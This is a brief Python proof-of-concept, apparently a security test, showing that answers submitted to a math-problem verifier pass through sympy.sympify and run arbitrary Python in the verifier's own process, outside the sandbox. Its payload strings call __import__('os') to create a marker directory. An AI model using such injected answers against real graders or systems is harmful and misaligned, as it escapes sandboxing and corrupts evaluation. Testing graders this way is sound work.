# Harmless demonstration: a claimed count payload reaches sympy.sympify (Python eval) in the
# verifier's own process (not the sandbox). Side effect: creates an empty directory in the scratchpad.
import os
from h import *
MARK = __import__("os").path.join(__import__("tempfile").gettempdir(), "mv_rce_marker_dir")
if __name__ == "__main__":
    if os.path.isdir(MARK):
        os.rmdir(MARK)
    pir = ir("count_structures", {"space": {"structure": "combination", "n": 5, "k": 2}, "predicate": ""}, answer_shape="count")
    payload = "[__import__('os').mkdir('%s'), 10][1]" % MARK
    r = run("rce_count", pir, sol(payload, "count"), None, show=True)
    print("marker dir created by verify():", os.path.isdir(MARK))
    # the same in a probability item? (payload goes through ctx.claimed -> parse_expr_str with _check_safe)
    pir2 = ir("probability", {"space": {"structure": "combination", "n": 5, "k": 2}, "event": ""})
    os.path.isdir(MARK) and os.rmdir(MARK)
    run("rce_prob", pir2, sol("[__import__('os').mkdir('%s'), 1][1]" % MARK), None, show=True)
    print("marker dir after probability:", os.path.isdir(MARK))
